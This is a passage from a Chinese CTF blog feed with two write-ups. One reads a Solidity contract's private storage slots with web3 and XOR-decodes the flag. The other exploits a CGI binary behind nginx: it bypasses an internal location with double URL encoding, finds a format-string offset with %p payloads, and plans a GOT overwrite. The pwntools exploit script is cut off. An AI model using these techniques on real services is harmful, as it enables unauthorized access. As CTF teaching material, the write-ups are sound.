<td style="text-align: center;">address</td>
<td style="text-align: center;">20</td>
</tr>
<tr>
<td style="text-align: center;">address payable</td>
<td style="text-align: center;">20</td>
</tr>
<tr>
<td style="text-align: center;">bool</td>
<td style="text-align: center;">1</td>
</tr>
<tr>
<td style="text-align: center;">uint{x}</td>
<td style="text-align: center;">{x}/8</td>
</tr>
<tr>
<td style="text-align: center;">int{x}</td>
<td style="text-align: center;">{x}/8</td>
</tr>
<tr>
<td style="text-align: center;">bytes{n}</td>
<td style="text-align: center;">{n}</td>
</tr>
<tr>
<td style="text-align: center;">bytes（动态字节数组）</td>
<td style="text-align: center;">？？？</td>
</tr>
<tr>
<td style="text-align: center;">string（动态字符串）</td>
<td style="text-align: center;">？？？</td>
</tr>
<tr>
<td style="text-align: center;">结构体、数组、映射</td>
<td style="text-align: center;">？？？</td>
</tr>
</tbody>
</table>
<h3 id="section"></h3>
<h3 id="题目分析">7.题目分析</h3>
<h5 id="shctf-just-signin">[SHCTF] just Signin</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161451526.png"
                      class=""
                >
<p>先看题目提供的合约，其中有存了一个flag，然后我们可以从外部调用verifyXORedFlag来验证我们输入的flag是否正确，但显然我们不可能直接去爆破flag的值，这时候我们参考ctf-wiki中关于<code>Ethereum Storage</code>的介绍。</p>
<blockquote>
<p>由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为
private，我们仍能读到变量的具体值。</p>
</blockquote>
<blockquote>
<p>利用 web3 提供的 <code>web3.eth.getStorageAt()</code>
方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。`</p>
</blockquote>
<p>那么我们就可以去用web3这个js库编写脚本来分析插槽内容。根据内存存储的规则，string类型的变量是动态分配内存的，由于存的内容大于31字节，所以该位置slot0会存大小，而keccak256(0)中会存实际内容。而且由于内容大于32字节，所以我们要连续读几个插槽，这里读两个就能读到全部内容了。</p>
<p>在写脚本过程中还遇到了几个坑：</p>
<ul>
<li>直接keccak256(0)出来的插槽位置中是全空的，实际上我们要得到的插槽位置在keccak256(abi.encodePacked(0))中，也就是在keccak256('0x0000000000000000000000000000000000000000000000000000000000000000')中。</li>
<li>其中用npm装web3库时后面测试运行时会报错，原因是我拿apt装的nodejs版本较低，解决方法是拿nvm重装高版本nodejs。</li>
<li><code>const web3 = new Web3("https://sepolia.infura.io/v3/your_api");</code>这个创建实例一开始我后面的url不知道填什么，从ChainList找了几个url填进去，然后会发现对应地址处的插槽是全空的，显然是找错链了。后面在infura注册后用里面的测试网络sepolia能够正确找到对应合约。</li>
</ul>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// const Web3 = require(&#x27;web3&#x27;);</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Web3</span> <span class="keyword">from</span> <span class="string">&#x27;web3&#x27;</span>;</span><br><span class="line"><span class="comment">// 连接到 Sepolia 测试网络（你需要替换成合适的提供商 URL）</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&quot;https://sepolia.infura.io/v3/your_api&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合约地址（在题目中提供的地址）</span></span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0x3948DF4C50B1671eaa6b22876Ea746899a6916C1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取存储的 private 变量 storedFlag</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getPrivateVariable</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取存储插槽的数据</span></span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Stored len in slot 0:`</span>, data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> startSlot = <span class="keyword">await</span> <span class="title class_">BigInt</span>(web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>));</span><br><span class="line">        <span class="comment">// 要读取的起始插槽</span></span><br><span class="line">        <span class="keyword">const</span> numSlots = <span class="number">2</span>; <span class="comment">// 要读取的插槽数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numSlots; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> slot = startSlot + <span class="title class_">BigInt</span>(i);</span><br><span class="line">            <span class="keyword">const</span> storageData = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, slot);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Data at slot <span class="subst">$&#123;slot&#125;</span>:`</span>, storageData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error reading slot:`</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getPrivateVariable</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005142240033.png"
                      class=""
                >
<p>然后我们就能得到经过异或加密的密文，简单解密回去后就能得到flag</p>
<p>python解密exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">85</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">5</span>, <span class="number">24</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">29</span>, <span class="number">55</span>, <span class="number">20</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">31</span>, <span class="number">12</span>, <span class="number">30</span>]</span><br><span class="line">key = <span class="string">&#x27;shctf&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    ch = enc[i] ^ <span class="built_in">ord</span>(key[i%<span class="number">5</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(ch)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>BlockChain</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>webpwn</title>
    <url>/blog/2024/09/21/webpwn/</url>
    <content><![CDATA[<h2 id="一web与pwn的联系">一、web与pwn的联系</h2>
<p>在某些 Web
服务中，会通过调用二进制程序来处理特定请求，尤其是在涉及动态内容生成、脚本执行、数据处理等场景时。以下是一些常见的例子：</p>
<h4 id="cgi-common-gateway-interface">1. <strong>CGI (Common Gateway
Interface)</strong></h4>
<ul>
<li><strong>概述：</strong> CGI 是一种通用的接口标准，允许 Web
服务器调用外部的二进制程序或脚本来生成动态内容。</li>
<li><strong>调用方式：</strong> 当用户请求特定路径时，Web 服务器会通过
CGI 将请求转发给二进制程序（例如 C/C++
编写的可执行文件）。程序运行后将生成的输出（通常是
HTML）返回给用户。</li>
<li><strong>示例：</strong> <code>httpd</code>、<code>nginx</code>
等服务器常通过 CGI 调用二进制文件，如 <code>/usr/lib/cgi-bin/</code>
中的程序。</li>
</ul>
<h4 id="fastcgi">2. <strong>FastCGI</strong></h4>
<ul>
<li><strong>概述：</strong> FastCGI 是 CGI
的增强版，通常用于调用长时间运行的二进制程序或脚本，以提高性能。</li>
<li><strong>调用方式：</strong> Web 服务器将请求传递给 FastCGI
进程，该进程是一个长期运行的二进制程序，能快速处理多个请求，而不必每次请求都重新启动程序。</li>
<li><strong>示例：</strong> PHP-FPM 就是一个常见的 FastCGI
进程管理器，它可以调用 PHP 解释器来处理请求。</li>
</ul>
<h4 id="后端服务调用">3. <strong>后端服务调用</strong></h4>
<ul>
<li><strong>概述：</strong> 有些 Web
服务会在后台调用二进制程序来执行任务，例如图像处理、数据分析、或其他复杂计算。</li>
<li><strong>调用方式：</strong> 通常通过系统调用（如 <code>exec</code>
或 <code>popen</code>）从 Web 应用程序（如 Python、Ruby、PHP
等）中调用二进制程序，并获取其输出结果。</li>
<li><strong>示例：</strong> 图像处理库 ImageMagick 或者 FFMPEG
等工具经常在 Web 服务中被调用来处理用户上传的媒体文件。</li>
</ul>
<h4 id="嵌入式设备-web-服务">4. <strong>嵌入式设备 Web
服务</strong></h4>
<ul>
<li><strong>概述：</strong> 在一些嵌入式系统（如路由器、NAS
设备等）中，Web
界面通常用于配置设备，而这些界面可能会调用二进制程序来执行系统命令或获取状态信息。</li>
<li><strong>调用方式：</strong> 嵌入式设备的 Web
服务器可能直接调用设备上的二进制文件来执行配置变更或获取系统状态。</li>
<li><strong>示例：</strong>
路由器的管理界面可能调用二进制程序来重启设备或修改网络设置。</li>
</ul>
<h4 id="server-side-includes-ssi">5. <strong>Server-Side Includes
(SSI)</strong></h4>
<ul>
<li><strong>概述：</strong> SSI 是一种服务器端技术，允许在 HTML
文件中包含其他文件或执行命令行程序。</li>
<li><strong>调用方式：</strong> 通过 SSI，可以在 HTML
中直接调用二进制程序，并将其输出嵌入到页面中。</li>
<li><strong>示例：</strong> 例如，在 Apache 中，可以通过
<code>&lt;!--#exec cmd="path/to/program"--&gt;</code>
来调用一个二进制程序并将其输出嵌入到 HTML 中。</li>
</ul>
<p>调用二进制程序的 Web
服务在动态内容生成和复杂任务处理时非常有用，尤其是在需要高效处理和利用已有二进制工具的情况下。使用这些技术时，可能会产生二进制的漏洞。</p>
<h2 id="二题目复现">二、题目复现</h2>
<h3 id="gateway">1.gateway</h3>
<p>以CGI产生的漏洞进行分析，这里分析时比较重要的是要在default文件里看Nginx配置信息。</p>
<h4 id="nginx配置信息">Nginx配置信息</h4>
<div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line"><span class="attribute">listen</span> [::]:<span class="number">80</span> default_server;</span><br><span class="line"><span class="attribute">root</span> /var/www/html;</span><br><span class="line"><span class="attribute">index</span> index.html index.htm index.nginx-debian.html;</span><br><span class="line"><span class="attribute">server_name</span> _;</span><br></pre></td></tr></table></figure></div>
<p><strong>listen 80 default_server;</strong></p>
<ul>
<li>配置 Nginx 监听 <code>80</code> 端口，这是默认的 HTTP 端口。</li>
<li><code>default_server</code>
表示这是默认的服务器块，当请求的主机名没有匹配到其他服务器块时，将使用此服务器块。</li>
</ul>
<p><strong>listen [::]:80 default_server;</strong></p>
<ul>
<li>这个指令与上面的类似，但它用于监听 IPv6 地址上的 <code>80</code>
端口。</li>
</ul>
<p><strong>root /var/www/html;</strong></p>
<ul>
<li>定义服务器的根目录。当请求的 URI 没有指向具体文件时，Nginx
会在此目录中查找资源。</li>
</ul>
<p><strong>index index.html index.htm
index.nginx-debian.html;</strong></p>
<ul>
<li>定义默认的主页文件列表。当用户访问一个目录时，Nginx
会依次查找这些文件作为首页。</li>
</ul>
<p>**server_name _;**</p>
<ul>
<li>设置服务器名。_ 表示匹配任何请求的服务器名。</li>
</ul>
<div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">    <span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /cgi-bin/note_handler &#123;</span><br><span class="line">    internal;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="number">127.0.0.1</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="section">location</span> /cgi-bin/ &#123;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$uri</span> = <span class="string">&quot;/cgi-bin/note_handler&quot;</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">expires</span> +<span class="number">1h</span>;</span><br><span class="line">    <span class="attribute">limit_rate</span> <span class="number">10k</span>;</span><br><span class="line">    <span class="attribute">root</span> /usr/share;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/fcgiwrap.socket;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> /cgi-bin/http;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/fastcgi_params;</span><br><span class="line">    <span class="comment">#fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span></span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span>/cgi-bin/http;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /cgi-bin/forward &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="number">127.0.0.1</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1/cgi-bin/http?action=print;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /get_flag &#123;</span><br><span class="line">    <span class="attribute">alias</span> /tmp/flag;</span><br><span class="line">    <span class="attribute">default_type</span> text/plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>location / { ... }</strong></p>
<ul>
<li>这个 <code>location</code> 块用于定义如何处理根路径 <code>/</code>
下的请求。
<ul>
<li><code>try_files $uri $uri/ =404;</code>：首先尝试按文件路径处理请求，如果找不到相应的文件或目录，则返回
<code>404</code> 错误。</li>
</ul></li>
</ul>
<p><strong>location /cgi-bin/note_handler { ... }</strong></p>
<ul>
<li>这个 <code>location</code> 块内部处理
<code>/cgi-bin/note_handler</code> 的请求，并通过
<code>proxy_pass</code> 将请求转发到 <code>http://127.0.0.1</code>。
<ul>
<li><code>internal;</code>：这个指令表示该路径是内部路径，不能直接从外部访问。</li>
<li><code>proxy_set_header</code> 设置了 <code>X-Forwarded-For</code>
头部为 <code>127.0.0.1</code>，通常用于标识原始请求的 IP 地址。</li>
</ul></li>
</ul>
<p><strong>location /cgi-bin/ { ... }</strong></p>
<ul>
<li>这个块定义了对 <code>/cgi-bin/</code> 目录下的请求的处理。
<ul>
<li><code>if ($uri = "/cgi-bin/note_handler") &#123; return 403; &#125;</code>：如果请求的
URI 是 <code>/cgi-bin/note_handler</code>，则返回
<code>403 Forbidden</code>。</li>
<li><code>expires +1h;</code>：设置响应缓存时间为1小时。</li>
<li><code>limit_rate 10k;</code>：限制响应速率为
<code>10KB/s</code>。</li>
<li><code>root /usr/share;</code>：定义此块的根目录为
<code>/usr/share</code>。</li>
<li><code>fastcgi_pass</code> 和 <code>fastcgi_index</code> 指定了
FastCGI 处理脚本的位置。</li>
<li><code>include /etc/nginx/fastcgi_params;</code> 包含了 FastCGI
的标准配置文件。</li>
<li><code>fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;</code>：设置
<code>SCRIPT_FILENAME</code> 参数，指定 CGI 脚本的路径。</li>
</ul></li>
</ul>
<p><strong>location /cgi-bin/forward { ... }</strong></p>
<ul>
<li>这个块处理 <code>/cgi-bin/forward</code> 请求，并将其代理到
<code>http://127.0.0.1/cgi-bin/http?action=print</code>。
<ul>
<li><code>proxy_set_header X-Forwarded-For 127.0.0.1;</code>：设置了
<code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>。</li>
<li><code>proxy_pass http://127.0.0.1/cgi-bin/http?action=print;</code>：将请求代理到指定的
URL。</li>
</ul></li>
</ul>
<p><strong>location /get_flag { ... }</strong></p>
<ul>
<li>这个块处理 <code>/get_flag</code> 请求。
<ul>
<li><code>alias /tmp/flag;</code>：将请求 <code>/get_flag</code> 映射到
<code>/tmp/flag</code> 文件。</li>
<li><code>default_type text/plain;</code>：将响应的内容类型设置为
<code>text/plain</code>。</li>
</ul></li>
</ul>
<h4 id="cgi脚本信息">cgi脚本信息</h4>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212314836.png"
                      class=""
                >
<p>先是通过三个getenv函数获取环境变量。如果我们发起如下的请求</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/cgi-bin/script?param1=value1&amp;param2=value2</span><br></pre></td></tr></table></figure></div>
<p>该请求的参数会加入到服务器的环境变量，具体的环境变量值如下：</p>
<ul>
<li><code>REQUEST_METHOD</code>：<code>GET</code></li>
<li><code>QUERY_STRING</code>：<code>param1=value1&amp;param2=value2</code></li>
<li><code>SCRIPT_NAME</code>：<code>/cgi-bin/script</code></li>
</ul>
<p>后续的几个判断就是限制了各参数的长度，以及限制了用..来进行目录穿越的手段。其中比较重要的就是这个url_decode函数，其作用是进行url解码，也正是这个函数结合Nginx服务器的配置产生了漏洞。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212329176.png"
                      class=""
                >
<p>后续先对请求方式进行判断，如果不是GET的话最后会返回<code>&lt;html&gt;&lt;title&gt;403 FORBIDDEN&lt;/title&gt;&lt;body&gt;Method not support.&lt;/body&gt;&lt;/html&gt;</code>这样的页面。后面的循环实现了逐个取出get的参数，其中解析了action以及content这两个参数。而最主要的漏洞也就是发生在content参数会用<code>snprintf(v14, (size_t)"%s", content, v6);</code>来处理，这个函数的参数设置产生了错误，导致格式化字符串%s被当成了一个数字大小来作为存到v14缓冲区的字节数量，而content也就成了解析的格式化字符串，于是产生了格式化字符串漏洞。</p>
<p>然后我们来看看前面有个check函数，这个函数也就是我们需要构造条件来绕过的一个检测函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212338234.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212346893.png"
                      class=""
                >
<p>我们发现这里主要做了两个检测，也就是<strong>X-Forwarded-For</strong>这个http请求头字段要为127.0.0.1。而且s1，也就是之前获取的cgi脚本路径要为<strong>/cgi-bin/note_handler</strong>。然而之前在nginx配置中/cgi-bin/note_handler有用<strong>internal</strong>来指定其不能被外部请求访问，绕不开这个就不能进行下一步利用，这该怎么办呢？这时候前面的<strong>url_decode</strong>就起了作用，我们可以把/cgi-bin/note_handler转成其url编码的形式传入（其实只用编码一个字符就能够绕过检测），此时能够通过如上check函数，因为s1是解码后的url。这里需要注意的是，由于http请求到达nginx服务器时会<strong>先进行一次url解码</strong>，所以如果我们想要把r进行url编码，直接转成%72是不够的，因为一开始它就被解码然后进location块而过不了检测。我们需要再把%也进行url编码，把r转成%2572输入，那么cgi程序最后调用url_decode后就得到了我们想要的/cgi-bin/note_handler。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212357022.png"
                      class=""
                >
<p>然后就是处理程序的主体逻辑了，使用之前与处理get参数相同的for循环来逐个获取以逗号分割的指令，实现了一个类似堆菜单题的操作。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212405705.png"
                      class=""
                >
<p>从这个add方法中可以看出，每个add的chunk中都有一个指向下一个节点的next域（<code>*((_QWORD *)dest + 13)</code>这个位置），全局变量dest存的是头节点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212414590.png"
                      class=""
                >
<p>由于是每次释放掉链表头节点，每次都会更新头节点，所以不会有悬挂指针，就不存在UAF。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212422128.png"
                      class=""
                >
<p>edit功能没啥用，改的内容和原来content里的内容相同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212430271.png"
                      class=""
                >
<p>print会遍历整个链表，可以展示每个节点的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212438450.png"
                      class=""
                >
<p>get_flag就是一个后门函数，不过这里把获取到flag的内容重定向到/dev/null丢弃了，直接调用也不会显示flag内容。</p>
<h4 id="利用方式">利用方式</h4>
<h5 id="如何调试">如何调试</h5>
<p>由于在CGI环境中，Web服务器（如Nginx）会将HTTP请求中的某些信息解析并传递给运行的CGI程序作为环境变量。我们这里看到的参数都是通过getenv传递的。所以如果我们像正常做pwn题那样直接对二进制程序进行分析，会发现少了服务器将http请求解析到环境变量这一环节，这时我们需要寻求别的方式来进行调试。</p>
<p>解决方法其实也很容易想到，既然是getenv加载参数，那么我们可以在gdb中直接来设置环境变量，这样之后就是正常的本地环境漏洞分析了。需要注意的是，本地在设置环境变量时都是模拟服务器处理后的参数，比如我们要传<strong>/cgi-bin/note_handle%2572</strong>，在调试时就要经过一层url解码，传入的是<strong>/cgi-bin/note_handle%72</strong>。</p>
<p>大致的调试方法如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./http&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;action=add,print&amp;content=%p%p%p&quot;</span></span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set env REQUEST_METHOD GET</span></span><br><span class="line"><span class="string">        set env QUERY_STRING &quot;<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="string">        set env SCRIPT_NAME /cgi-bin/note_handle%72</span></span><br><span class="line"><span class="string">        set env HTTP_X_FORWARDED_FOR 127.0.0.1</span></span><br><span class="line"><span class="string">        b getenv</span></span><br><span class="line"><span class="string">        r</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>这时我们可能会遇到如下问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212450571.png"
                      class=""
                >
<p>首先猜测是地址对其的问题，这里rsi的值为0x7fffffffef86，rsi+rdx-0x40不是16字节对齐的，我们看看0x7fffffffef86附近的内存布局：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212457536.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212504437.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212510945.png"
                      class=""
                >
<p>可以发现这个getenv返回的是一个指向环境变量地址的指针，而且环境变量依次存在这个栈段的高地址处。我们可以尝试构造环境变量时使其大小刚好满足对齐条件试试。我首先是尝试把query_string那个环境变量变长从而把后面的script_name弄对齐，但是发现不会改变script_name值的位置。那么就猜测这个环境变量是从高地址往低地址存的，换一下环境变量设置的顺序后再改payload长度。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212523016.png"
                      class=""
                >
<p>此时就能不报上述错误继续调试，其实这里我在执行memcpy时rsi指针末位还是f，并没有对齐。这时可能就是原来rsi+rdx-0x40，也就是rsi+0x40这个地址已经越过了环境变量段，是一个不能访问的地址。而调换顺序后rsi+0x40仍然在环境变量这个可访问的地址当中。误打误撞也算是能够过了。（很有意思的是，gdb调试中可以继续，然而执行脚本的主程序的显示却是早早退出，显示403，但只要能够调试就行）。</p>
<h5 id="漏洞利用">漏洞利用</h5>
<p>为了方便起见，一开始可以直接在print函数上打断点,这样一进去执行一下就能看到格式化字符串漏洞的执行效果。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set env REQUEST_METHOD GET</span></span><br><span class="line"><span class="string">        set env SCRIPT_NAME /cgi-bin/note_handle%72</span></span><br><span class="line"><span class="string">        set env QUERY_STRING <span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">        set env HTTP_X_FORWARDED_FOR 127.0.0.1</span></span><br><span class="line"><span class="string">        b getenv</span></span><br><span class="line"><span class="string">        r</span></span><br><span class="line"><span class="string">        delete break 1</span></span><br><span class="line"><span class="string">        b *(0x000000000401C7A)</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>经过调试我们可以确定，我们控制的content中的内容偏移为10。（用AAAAAAAA%10$p测得）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212555410.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212614557.png"
                      class=""
                >
<p>之后修改puts的got表为system就行。</p>
<h5 id="exp">exp</h5>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for pwn exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC = <span class="number">1</span></span><br><span class="line">REMOTE = <span class="number">0</span></span><br><span class="line">elf_path = <span class="string">&#x27;./http&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">code = ELF(elf_path)</span><br><span class="line">context.arch=code.arch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">uu32    = <span class="keyword">lambda</span>: u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>,drop=<span class="literal">False</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>:u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,drop=<span class="literal">False</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s:io.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span 